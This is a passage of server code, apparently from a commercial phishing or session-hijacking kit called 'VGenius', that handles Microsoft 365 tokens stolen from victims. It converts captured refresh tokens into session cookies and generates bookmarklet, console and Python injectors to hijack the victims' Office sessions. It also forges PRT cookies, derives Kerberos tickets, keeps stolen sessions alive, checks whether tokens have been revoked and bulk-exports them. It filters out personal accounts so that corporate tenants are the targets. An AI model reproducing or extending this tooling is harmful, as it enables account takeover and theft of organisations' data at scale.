  html += '     script += \"      document.cookie = c.name + \\\"=\\\" + encodeURIComponent(c.value) + \\\"; domain=\\\" + c.domain + \\\"; path=/; Secure; SameSite=None\\\";\\n\";\\n';
  html += '     script += \"    } catch(e) {}\\n\";\\n';
  html += '     script += \"  });\\n\";\\n';
  html += '     script += \"  console.log(\\\"[VGenius] Injected \" + cookies.length + \" cookies. Refresh the page.\\\");\\n\";\\n';
  html += '     script += \"  setTimeout(function() { window.location.href = \\\\\\\"https://www.office.com/\\\\\\\"; }, 2000);\\n\";\\n';
  html += '     script += \"})();\";\\n';
  html += '     scriptContent.textContent = script;\\n';
  html += '   }\\n';
  html += ' }\\n';
  html += '\\n';
  html += ' function copyScript() {\\n';
  html += '   var content = document.getElementById(\"scriptContent\").textContent;\\n';
  html += '   navigator.clipboard.writeText(content).then(function() {\\n';
  html += '     setStatus(\"Script copied to clipboard!\", \"success\");\\n';
  html += '   }).catch(function() {\\n';
  html += '     var ta = document.createElement(\"textarea\");\\n';
  html += '     ta.value = content; ta.style.position = \"fixed\"; ta.style.opacity = \"0\";\\n';
  html += '     document.body.appendChild(ta); ta.select(); document.execCommand(\"copy\");\\n';
  html += '     document.body.removeChild(ta);\\n';
  html += '     setStatus(\"Script copied to clipboard!\", \"success\");\\n';
  html += '   });\\n';
  html += ' }\\n';
  html += ' </script>\\n';
  html += '</body></html>';

  return html;
}

// ─── Python requests script ─────────────────────────────────────────
function generatePythonScript(cookies) {
  var script = '#!/usr/bin/env python3\n';
  script += '# VGenius Cookie Session Injector - Python Version\n\n';
  script += 'import requests\n';
  script += 'from datetime import datetime\n\n';
  script += 'cookies = ' + JSON.stringify(cookies, null, 2) + '\n\n';
  script += 'session = requests.Session()\n\n';
  script += 'print("Injecting cookies...")\n';
  script += 'for cookie in cookies:\n';
  script += ' try:\n';
  script += ' session.cookies.set(\n';
  script += ' name=cookie["name"],\n';
  script += ' value=cookie["value"],\n';
  script += ' domain=cookie["domain"],\n';
  script += ' secure=True,\n';
  script += ' samesite="None"\n';
  script += ' )\n';
  script += ' print(f"Injected: {cookie[\'name\']}")\n';
  script += ' except Exception as e:\n';
  script += ' print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
  script += 'print("\\nSession ready!")\n';
  script += 'print(f"Total cookies: {len(cookies)}")\n';
  script += 'print(f"Generated at: {datetime.now()}")\n';

  return script;
}

// ─── Bookmarklet-based injector (competitor's proven document.cookie method) ──
function generateInjectorScript(cookies, clientId, tenant) {
  var cookieJson = JSON.stringify(cookies);

  // Build bookmarklet code using document.cookie method
var bookmarklet = 'javascript:(function(){' + 
  'var cookies=' + cookieJson + ';' + 
  'cookies.forEach(function(c){' + 
  'var domain=c.domain||".login.microsoftonline.com";' + 
  'document.cookie=c.name+"="+encodeURIComponent(c.value)+"; domain="+domain+"; path=/; Secure; SameSite=None";' + 
  '});' + 
  'setTimeout(function(){' + 
   'window.location.href="https://www.office.com/";' + 
  '},2000);' + 
  '})()';

  var script = '<!DOCTYPE html>\n<html><head><title>VGenius Cookie Injector</title></head><body>\n';
  script += '<h1 style="color:#00ccff">Cookie Injection Ready</h1>\n';
  script += '<p>Drag the button below to your bookmarks bar, then click it on the Microsoft login page.</p>\n';
  script += '<div id="bookmarklet"></div>\n';
  script += '<div id="status">Instructions will appear here.</div>\n';
  script += '<script>\n';
  script += 'var bookmarklet = "' + bookmarklet.replace(/"/g, '\\"') + '";\n';
  script += 'var div = document.getElementById("bookmarklet");\n';
  script += 'div.innerHTML = \'<a href="\' + bookmarklet + \'" style="display:inline-block;padding:15px 30px;background:#00ccff;color:#000;text-decoration:none;border-radius:6px;font-weight:bold;">Inject Cookies</a>\';\n';
  script += '</script>\n';
  script += '</body></html>';

  return script;
}

// ─── Manual cookie renewal ──────────────────────────────────────────
router.post('/:id/renew', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for renewal' });
    }

    // Use refresh token for direct renewal (no popup needed)
    if (refreshToken) {
      try {
        const cookieConverter = require('../services/cookieconverter');
        const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
        const tokenTenant = token.tenant || config.AZURE_TENANT || 'common';

        // Use stored client_id if available, otherwise fall back to env
        const tokenClientId = token.client_id || config.AZURE_CLIENT_ID;
        const result = await cookieConverter.convertTokensToCookies(
          refreshToken, templateType, tokenTenant, null, token.account_type || 'unknown'
        );

        if (result.success && result.cookies) {
          const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
          const newAccessToken = result.access_token || accessToken;
          const newRefreshToken = result.new_refresh_token || refreshToken;

          await db.query(
            `UPDATE captured_tokens
             SET cookies_encrypted = ?, token_type = 'cookie',
                 expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
                 last_renewed = NOW(),
                 renewal_count = COALESCE(renewal_count, 0) + 1,
                 access_token_encrypted = ?, refresh_token_encrypted = ?
             WHERE id = ?`,
            [
              encrypt(JSON.stringify(result.cookies)),
              ttlHours,
              encrypt(newAccessToken),
              encrypt(newRefreshToken),
              token.id
            ]
          );

          await db.query(
            'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
            [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
          );

        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
        const cookieCount = result.cookies ? (Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(c => c.trim()).length) : 0;
        return res.json({
          success: true,
          message: 'Session renewed successfully using refresh token',
          cookies: result.cookies,
          cookie_count: cookieCount
        });
        }
      } catch (refreshErr) {
        console.error('[Tokens] Refresh token renewal failed:', refreshErr.message);
      }
    }

    // Fallback: For cookie-mode tokens without valid link_id, try direct refresh token exchange
    if (!token.link_id || token.token_type === 'cookie') {
      // Use the cookie converter as fallback
      const cookieConverter = require('../services/cookieconverter');
      const cookieResult = await cookieConverter.convertTokensToCookies(
        refreshToken || accessToken, 'office', token.tenant || 'common', null, token.account_type || 'unknown'
      );

      if (cookieResult.success && cookieResult.cookies) {
        const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
        await db.query(
          'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?',
          [encrypt(JSON.stringify(cookieResult.cookies)), 'cookie', ttlHours, token.id]
        );
        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
        const cookieCount = cookieResult.cookies ? (Array.isArray(cookieResult.cookies) ? cookieResult.cookies.length : cookieResult.cookies.split(';').filter(c => c.trim()).length) : 0;
        return res.json({
          success: true,
          message: 'Session renewed successfully',
          cookies: cookieResult.cookies,
          cookie_count: cookieCount
        });
      }
      return res.status(400).json({ error: 'Renewal failed: ' + (cookieResult.error || 'Could not refresh session'), success: false });
    }

    // Try device code flow only if we have a valid link_id
    const deviceProxy = require('../services/deviceproxy');
    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
    const jwtToken = require('jsonwebtoken').sign(
      { user_id: req.user.id, link_id: token.link_id },
      require('../config/env').JWT_SECRET,
      { expiresIn: '1h' }
    );

    const result = await deviceProxy.startDeviceFlow('cookie', jwtToken, apiBaseUrl);

    if (result.user_code) {
      await db.query(
        'INSERT INTO cookie_renewals (capture_id, user_id, user_code, success, created_at) VALUES (?, ?, ?, 0, NOW())',
        [token.id, req.user.id, result.user_code]
      );

      res.json({
        success: true,
        job_id: result.job_id,
        user_code: result.user_code,
        verification_uri: result.verification_uri,
        message: 'Renewal initiated. Complete authentication in the popup.',
        instructions: 'A popup will open. Enter the code and complete the Microsoft login.'
      });
    } else {
      res.status(400).json({ error: 'Failed to start renewal flow', success: false });
    }
  } catch (err) {
    const errorMsg = err.message || err.toString() || 'Unknown error';
    console.error('[Tokens] Renewal error:', errorMsg);
    res.status(500).json({ error: 'Renewal failed: ' + errorMsg });
  }
});

// ─── Get renewal history ────────────────────────────────────────────
router.get('/:id/renewals', userAuth, async (req, res) => {
  try {
    const [renewals] = await db.query(
      'SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50',
      [req.params.id, req.user.id]
    );
    res.json(renewals);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── One-shot console script for direct cookie injection ─────────────
router.get('/inject-script', userAuth, async (req, res) => {
  try {
    const { token_id } = req.query;
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for injection' });
    }

    // FIX: Pass tenant and account type for proper domain handling
    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var accountType = token.account_type || 'unknown';

    // Get cookies from token - require actual cookies only (no fallback)
    var cookiesList = [];
    var cookiesDecrypted = decrypt(token.cookies_encrypted);
    if (cookiesDecrypted) {
      cookiesList = parseCookies(cookiesDecrypted, { tenant: tenant, accountType: accountType });
    }

    if (cookiesList.length === 0) {
      return res.status(400).json({ error: 'No cookies available for injection' });
    }

    // Build cookie injection statements with proper domains
    var cookieStatements = '';
    for (var i = 0; i < cookiesList.length; i++) {
      var c = cookiesList[i];
      cookieStatements += 'document.cookie = "' + c.name + '=' + c.value.replace(/"/g, '\\"') + '; domain=' + (c.domain || '.login.microsoftonline.com') + '; path=/; Secure; SameSite=None";\n';
    }

    const script = '(function() {\n' +
      cookieStatements + '\n' +
      '// Redirect to Office.com after injecting cookies\n' +
      'setTimeout(function() {\n' +
      'window.location.href = "https://www.office.com/";\n' +
      '}, 3000);\n' +
      '})();';

    res.type('application/javascript').send(script);
  } catch (err) {
    console.error('[Tokens] Inject script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

// ─── PRT-only cookie injection script (exact competitor format) ──────
router.get('/prt-inject', userAuth, async (req, res) => {
  try {
    const { token_id } = req.query;
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const idToken = decrypt(token.id_token_encrypted);

    if (!refreshToken) {
      return res.status(400).json({ error: 'No refresh token available' });
    }

    // Extract tid and uid for PRT construction
    let tid = token.tenant || 'common';
    let uid = '';

    // Try to get uid from session_key_jwe or client_info
    const sessionKeyJwe = decrypt(token.session_key_jwe);
    if (sessionKeyJwe) {
      try {
        const parsed = JSON.parse(sessionKeyJwe);
        if (parsed.client_info) {
          const decoded = Buffer.from(parsed.client_info, 'base64').toString();
          const info = JSON.parse(decoded);
          uid = info.uid || '';
        }
      } catch (e) { /* ignore */ }
    }

    // Try to get tid from id_token
    if (idToken) {
      try {
        const payload = idToken.split('.')[1];
        let padded = payload;
        while (padded.length % 4) padded += '=';
        const decoded = JSON.parse(Buffer.from(padded, 'base64').toString());
        tid = decoded.tid || tid;
      } catch (e) { /* ignore */ }
    }

    // Generate PRT cookie using cookie converter
    const cookieConverter = require('../services/cookieconverter');
    const prtCookieObj = cookieConverter.generateXmsRefreshTokenCredential(
      refreshToken,
      token.account_type || 'work_school',
      { tid: tid, uid: uid, scopes: 'openid profile email offline_access https://graph.microsoft.com/.default' }
    );

    if (!prtCookieObj || !prtCookieObj.value) {
      return res.status(400).json({ error: 'Failed to generate PRT cookie' });
    }

    // Generate exact competitor format script
    const script = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";
// Redirect after 3s
setTimeout(() => {
  window.location.href = "https://login.microsoftonline.com/?auth=2";
}, 3000);`;

    res.type('application/javascript').send(script);
  } catch (err) {
    console.error('[Tokens] PRT inject error:', err);
    res.status(500).json({ error: 'Failed to generate PRT injection script' });
  }
});

// ─── Convert stored token to cookies (by token ID) ──────────────────
router.post('/:id/convert', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );

    if (!tokens.length) {
      // Log whether the token exists but belongs to another user
      const [check] = await db.query(
        'SELECT user_id FROM captured_tokens WHERE id = ?',
        [req.params.id]
      );
      if (check.length) {
        console.error('[Tokens] Convert: token ' + req.params.id + ' belongs to user ' + check[0].user_id + ', not ' + req.user.id);
      } else {
        console.error('[Tokens] Convert: token ' + req.params.id + ' does not exist');
      }
      return res.status(404).json({ error: 'Token not found' });
    }

    const token = tokens[0];
    const accessToken = safeDecrypt(token.access_token_encrypted);
    const refreshToken = safeDecrypt(token.refresh_token_encrypted);

    if (!accessToken && !refreshToken) {
      return res.status(400).json({ error: 'No tokens available for conversion' });
    }

    const cookieConverter = require('../services/cookieconverter');
    const templateType = token.template_type || 'office';
    const tenant = token.tenant || config.AZURE_TENANT || 'common';
    const accountType = token.account_type || 'unknown';

    const result = await cookieConverter.convertTokensToCookies(
      accessToken || refreshToken,
      templateType,
      tenant,
      token.prt || null,
      accountType
    );

    if (result.success && result.cookies) {
      // Store cookies for future use
      try {
        await db.query(
          'UPDATE captured_tokens SET cookies_encrypted = ? WHERE id = ? AND user_id = ?',
          [encrypt(JSON.stringify(result.cookies)), token.id, req.user.id]
        );
      } catch (e) {
        console.warn('[Tokens] Could not store cookies:', e.message);
      }

      return res.json({
        success: true,
        message: 'Token converted to cookies successfully',
        cookies: result.cookies,
        cookie_count: Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(c => c.trim()).length,
        target_url: result.target_url || 'https://www.office.com/',
        expires: '30 days',
        instructions: 'Use the extension or injector to set cookies in your browser'
      });
    } else {
      console.error('[Tokens] Convert error:', result.error);
      return res.status(400).json({
        success: false,
        error: result.error || 'Conversion failed',
        debug: result.debug
      });
    }
  } catch (err) {
    console.error('[Tokens] Convert error:', err);
    return res.status(500).json({ error: 'Conversion failed: ' + err.message });
  }
});

// ─── Manual cookie conversion from pasted access token ──────────────
router.post('/convert-cookie', userAuth, async (req, res) => {
  try {
    const { access_token, template_type, tenant, account_type, refresh_token } = req.body;

    if (!access_token && !refresh_token) {
      return res.status(400).json({ error: 'Access token or refresh token is required' });
    }

    const tokenToUse = access_token || refresh_token;
    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(
      tokenToUse,
      template_type || 'office',
      tenant || 'common',
      null,
      account_type || 'unknown'
    );

    if (result.success && result.cookies) {
      res.json({
        success: true,
        cookies: result.cookies,
        cookie_count: Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
        expires: '30 days',
        instructions: 'Use the injector page to set cookies in your browser'
      });
    } else {
      console.error('[Tokens] Convert-cookie error:', result.error);
      res.status(400).json({ 
        success: false, 
        error: result.error || 'Conversion failed',
        debug: result.debug
      });
    }
  } catch (err) {
    console.error('[Tokens] Conversion error:', err);
    res.status(500).json({ error: 'Conversion failed: ' + err.message });
  }
});

// ─── Export tokens ──────────────────────────────────────────────────
router.post('/export', userAuth, async (req, res) => {
  try {
    const deleteAfter = req.body && req.body.delete_after === true;

    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => {
      const safeDecrypt = (val) => {
        if (!val) return null;
        try { return decrypt(val); } catch (e) { return null; }
      };

      // Build PRT JSON object matching competitor format
      const prtData = {
        token_type: 'Bearer',
        expires_in: 1209599,
        ext_expires_in: 0,
        expires_on: token.expiration ? Math.floor(new Date(token.expiration).getTime() / 1000) : null,
        refresh_token: safeDecrypt(token.refresh_token_encrypted),
        refresh_token_expires_in: 1209599,
        id_token: safeDecrypt(token.id_token_encrypted),
        client_info: null,
        session_key_jwe: safeDecrypt(token.session_key_jwe),
        device_tenant_id: safeDecrypt(token.device_tenant_id),
        tgt_ad: safeDecrypt(token.tgt_ad),
        tgt_cloud: safeDecrypt(token.tgt_cloud),
        kerberos_top_level_names: safeDecrypt(token.kerberos_top_level_names),
        session_key: null,
        tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
      };

      // Try to extract client_info from session_key_jwe
      if (prtData.session_key_jwe) {
        try {
          const parsed = JSON.parse(prtData.session_key_jwe);
          if (parsed.client_info) {
            prtData.client_info = parsed.client_info;
          }
          if (parsed.session_key) {
            prtData.session_key = parsed.session_key;
          }
        } catch (e) { /* ignore */ }
      }

      return {
        mode: token.token_type || 'cookie',
        email: token.email || '',
        name: token.email ? token.email.split('@')[0] : '',
        access_token: safeDecrypt(token.access_token_encrypted),
        refresh_token: safeDecrypt(token.refresh_token_encrypted),
        prt: JSON.stringify(prtData),
        expires_at: token.expiration ? new Date(token.expiration).toISOString() : null,
        status: 'active',
        notes: token.notes || null,
        created_at: token.created_at ? new Date(token.created_at).toISOString() : null
      };
    });

    if (deleteAfter) {
      await db.query(
        'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0',
        [req.user.id]
      );
    }

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length,
      deleted: deleteAfter
    });
  } catch (err) {
    console.error('[Tokens] Export error:', err);
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// ─── Export and delete all ──────────────────────────────────────────
router.post('/export-delete-all', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => {
      const safeDecrypt = (val) => {
        if (!val) return null;
        try { return decrypt(val); } catch (e) { return null; }
      };

      const prtData = {
        token_type: 'Bearer',
        expires_in: 1209599,
        ext_expires_in: 0,
        expires_on: token.expiration ? Math.floor(new Date(token.expiration).getTime() / 1000) : null,
        refresh_token: safeDecrypt(token.refresh_token_encrypted),
        refresh_token_expires_in: 1209599,
        id_token: safeDecrypt(token.id_token_encrypted),
        client_info: null,
        session_key_jwe: safeDecrypt(token.session_key_jwe),
        device_tenant_id: safeDecrypt(token.device_tenant_id),
        tgt_ad: safeDecrypt(token.tgt_ad),
        tgt_cloud: safeDecrypt(token.tgt_cloud),
        kerberos_top_level_names: safeDecrypt(token.kerberos_top_level_names),
        session_key: null,
        tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
      };

      if (prtData.session_key_jwe) {
        try {
          const parsed = JSON.parse(prtData.session_key_jwe);
          if (parsed.client_info) prtData.client_info = parsed.client_info;
          if (parsed.session_key) prtData.session_key = parsed.session_key;
        } catch (e) { /* ignore */ }
      }

      return {
        mode: token.token_type || 'cookie',
        email: token.email || '',
        name: token.email ? token.email.split('@')[0] : '',
        access_token: safeDecrypt(token.access_token_encrypted),
        refresh_token: safeDecrypt(token.refresh_token_encrypted),
        prt: JSON.stringify(prtData),
        expires_at: token.expiration ? new Date(token.expiration).toISOString() : null,
        status: 'active',
        notes: token.notes || null,
        created_at: token.created_at ? new Date(token.created_at).toISOString() : null
      };
    });

    await db.query(
      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length,
      deleted: true
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Derive Kerberos TGTs for a specific token ──────────────────────
router.post('/:id/derive-tgt', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];

    // Call kerberos service to derive TGTs
    const result = await kerberosService.deriveTGTForToken(req.params.id);

    if (result.success) {
      res.json({
        success: true,
        message: 'Kerberos TGTs derived successfully',
        token_id: result.token_id,
        email: result.email,
        tgt_cloud: result.tgt_cloud,
        tgt_ad: result.tgt_ad,
        session_key: result.session_key,
        kerberos_top_level_names: result.kerberos_top_level_names,
        tgt_cloud_sessionkey: result.tgt_cloud_sessionkey
      });
    } else {
      res.status(400).json({ error: result.error, success: false });
    }
  } catch (err) {
    console.error('[Tokens] TGT derivation error:', err.message);
    res.status(500).json({ error: 'TGT derivation failed: ' + err.message });
  }
});

// ─── Bulk derive Kerberos TGTs for all eligible tokens ──────────────
router.post('/bulk-derive-tgts', userAuth, async (req, res) => {
  try {
    const limit = parseInt(req.body.limit) || 50;
    const stats = await kerberosService.bulkDeriveTGTs(limit);
    res.json({
      success: true,
      ...stats
    });
  } catch (err) {
    console.error('[Tokens] Bulk TGT derivation error:', err.message);
    res.status(500).json({ error: 'Bulk TGT derivation failed: ' + err.message });
  }
});

// ─── Get full PRT credential blob for injection ─────────────────────
router.get('/:id/full-credential-blob', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const result = await kerberosService.getFullPRTCredentialBlob(req.params.id);

    if (result.success) {
      res.json({
        success: true,
        blob: result.blob
      });
    } else {
      res.status(400).json({ error: result.error, success: false });
    }
  } catch (err) {
    console.error('[Tokens] Credential blob error:', err.message);
    res.status(500).json({ error: 'Failed to get credential blob: ' + err.message });
  }
});

// ─── Check token status (active/revoked) ─────────────────────────────────
router.post('/check-status', userAuth, async (req, res) => {
  try {
    const { token_id } = req.body;
    
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }
    
    // Get token
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    
    if (!tokens.length) {
      return res.status(404).json({ error: 'Token not found' });
    }
    
    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const clientId = token.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
    const tenant = token.tenant || config.AZURE_TENANT || 'common';
    
    if (!refreshToken) {
      return res.json({ status: 'unknown', message: 'No refresh token available' });
    }
    
    // Try to refresh the token to check if it's still valid
    const axios = require('axios');
    const tokenEndpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
    
    try {
      const response = await axios.post(
        tokenEndpoint,
        new URLSearchParams({
          client_id: clientId,
          grant_type: 'refresh_token',
          refresh_token: refreshToken,
          scope: 'openid profile offline_access https://graph.microsoft.com/.default'
        }),
        {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          timeout: 15000
        }
      );
      
      if (response.data.access_token) {
        // Token is still active - update status
        await db.query(
          'UPDATE captured_tokens SET token_status = ? WHERE id = ?',
          ['active', token_id]
        );
        
        return res.json({ status: 'active', message: 'Token is valid and active' });
      }
    } catch (err) {
      // Check if error indicates revoked token
      const errorData = err.response?.data;
      if (errorData?.error === 'invalid_grant' || 
          errorData?.error === 'invalid_request' ||
          (errorData?.error_description && 
           (errorData.error_description.includes('revoked') || 
            errorData.error_description.includes('expired')))) {
        
        // Token is revoked
        await db.query(
          'UPDATE captured_tokens SET token_status = ? WHERE id = ?',
          ['revoked', token_id]
        );
        
        return res.json({ status: 'revoked', message: 'Token has been revoked' });
      }
    }
    
    return res.json({ status: 'unknown', message: 'Could not determine token status' });
  } catch (err) {
    console.error('[Tokens] Check status error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Import token manually ────────────────────────────────────────────────
router.post('/import', userAuth, tokenUpload.single('tokenFile'), async (req, res) => {
  try {
    // Check if this is a file upload (multipart/form-data)
    if (req.files && req.files.tokenFile) {
      return await importTokenFile(req, res);
    }

    // Standard JSON body import
    const {
      refresh_token,
      access_token,
      id_token,
      client_id,
      email,
      tenant,
      account_type,
      notes,
      prt,
      name
    } = req.body;

    if (!refresh_token && !prt) {
      return res.status(400).json({ error: 'refresh_token or prt is required' });
    }

    const clientId = client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const emailAddress = email || '';
    const tokenName = name || '';

    // Extract email from id_token if not provided
    let extractedEmail = emailAddress;
    if (!extractedEmail && id_token) {
      try {
        const tokenParts = id_token.split('.');
        if (tokenParts.length === 3) {
          const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
          extractedEmail = payload.email || payload.preferred_username || '';
        }
      } catch (e) {
        // Could not extract email from id_token
      }
    }

    // ─── Personal Account Detection & Rejection ────────────────
    // Check if the email domain is a known personal Microsoft account domain
    const personalDomains = [
      'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
      'outlook.co', 'hotmail.co', 'live.co', 'msn.co',
      'outlook.fr', 'hotmail.fr', 'live.fr', 'msn.fr',
      'outlook.de', 'hotmail.de', 'live.de', 'msn.de',
      'outlook.it', 'hotmail.it', 'live.it', 'msn.it',
      'outlook.es', 'hotmail.es', 'live.es', 'msn.es',
      'outlook.com.br', 'hotmail.com.br', 'live.com.br',
      'outlook.com.au', 'hotmail.com.au', 'live.com.au',
      'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
      'outlook.in', 'hotmail.in', 'live.in',
      'outlook.jp', 'hotmail.jp', 'live.jp',
      'outlook.kr', 'hotmail.kr', 'live.kr',
      'gmail.com', 'gmail.co', 'googlemail.com',
      'yahoo.com', 'yahoo.co', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de',
      'icloud.com', 'me.com', 'mac.com',
      'aol.com', 'aol.co', 'aim.com',
      'protonmail.com', 'proton.me', 'pm.me',
      'mail.com', 'gmx.com', 'gmx.de', 'web.de',
      'yandex.com', 'yandex.ru', 'mail.ru'
    ];

    const emailDomain = extractedEmail ? extractedEmail.split('@').pop().toLowerCase() : '';
    const isPersonalEmail = personalDomains.includes(emailDomain);

    // Also check if account_type is explicitly personal
    const isPersonalAccount = account_type === 'personal' || isPersonalEmail;

    if (isPersonalAccount) {
      return res.status(400).json({
        error: 'Personal Microsoft accounts are not supported',
        details: `The email domain "${emailDomain}" is a personal account provider. Only Work/School (Microsoft 365 / Azure AD) accounts are supported.`,
        supported: 'Work/School accounts with custom domains (e.g., user@company.com, user@school.edu, user@organization.org)'
      });
    }

    // ─── Validate Work/School Account ──────────────────────────
    // Check if email has a valid domain (not just @outlook.com etc.)
    if (extractedEmail) {
      const domainParts = emailDomain.split('.');
      // Must have at least 2 parts and not be a known personal domain
      if (domainParts.length < 2) {
        return res.status(400).json({
          error: 'Invalid email format',
          details: 'The email address does not have a valid domain.'
        });
      }

      // Check for common work/school TLDs
      const workTlds = ['.edu', '.gov', '.org', '.ac', '.mil', '.co'];
      const hasWorkTld = workTlds.some(tld => emailDomain.endsWith(tld));

      // If it's a single-word domain (like @company), it might still be valid
      // but we flag it for review
      if (!hasWorkTld && domainParts.length === 2 && domainParts[0].length < 3) {
        return res.status(400).json({
          error: 'Suspicious email domain',
          details: `The domain "${emailDomain}" appears to be a personal account provider. Only Work/School accounts are supported.`
        });
      }
    }

    // Force account type to work_school
    const accountType = 'work_school';

    // Encrypt tokens
    const accessEncrypted = access_token ? encrypt(access_token) : null;
    const refreshEncrypted = refresh_token ? encrypt(refresh_token) : null;
    const idEncrypted = id_token ? encrypt(id_token) : null;
    const prtEncrypted = prt ? encrypt(prt) : null;

    // Insert into database
    const [result] = await db.query(
      `INSERT INTO captured_tokens
       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted,
        id_token_encrypted, prt, ip_address, user_agent, notes, expiration, tenant, template_type,
        account_type, client_id, token_status, name)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?)`,
      [
        req.user.id,
        null,
        extractedEmail,
        'token',
        accessEncrypted,
        refreshEncrypted,
        idEncrypted,
        prtEncrypted,
        'manual',
        'Manual Import',
        notes || '',
        tenantVal,
        'office',
        accountType,
        clientId,
        'active',
        tokenName
      ]
    );

    res.json({
      success: true,
      token_id: result.insertId,
      email: extractedEmail,
      message: 'Token imported successfully'
    });
  } catch (err) {
    console.error('[Tokens] Import error:', err.message);
    res.status(500).json({ error: 'Server error: ' + err.message });
  }
});

// ─── Import token from file (JSON/TXT) ─────────────────────────────────────
async function importTokenFile(req, res) {
  try {
    // When using multer.single('tokenFile'), the file is in req.file
